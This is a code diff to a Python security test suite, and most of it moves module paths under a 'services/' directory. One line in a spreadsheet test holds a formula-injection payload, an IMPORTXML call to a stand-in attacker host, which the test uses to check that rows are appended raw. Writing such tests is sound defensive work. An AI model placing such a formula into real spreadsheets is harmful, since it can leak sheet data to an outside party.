@@ -28,10 +28,10 @@ def load(name, relative):
     return module
 
 
-gh = load("gh_security_test", "mcp-proxy/gh-read-server.py")
-images = load("image_tools", "signal-bot-patches/image_tools.py")
-search = load("image_search_security_test", "signal-bot-custom-skills/image_search/image_search.py")
-proxy = load("public_proxy_security_test", "public-egress/server.py")
+gh = load("gh_security_test", "services/mcp-proxy/gh-read-server.py")
+images = load("image_tools", "services/signal-bot/patches/image_tools.py")
+search = load("image_search_security_test", "services/signal-bot/skills/image_search/image_search.py")
+proxy = load("public_proxy_security_test", "services/public-egress/server.py")
 
 
 def dns(addresses):
@@ -175,7 +175,7 @@ class NetworkBoundary(unittest.TestCase):
 class SheetBoundary(unittest.TestCase):
     def test_append_uses_raw_for_formula_payloads(self):
         # Execute the actual append method without Google credentials/dependencies.
-        source = ast.parse((ROOT / 'receipt-watcher/receipt_watcher/sheets.py').read_text())
+        source = ast.parse((ROOT / 'services/receipt-watcher/receipt_watcher/sheets.py').read_text())
         cls = next(node for node in source.body if isinstance(node, ast.ClassDef) and node.name == 'SheetsClient')
         method = next(node for node in cls.body if isinstance(node, ast.FunctionDef) and node.name == 'append_receipt')
         namespace = {'_build_row': lambda *args: ['=IMPORTXML("https://evil.example","//x")'],
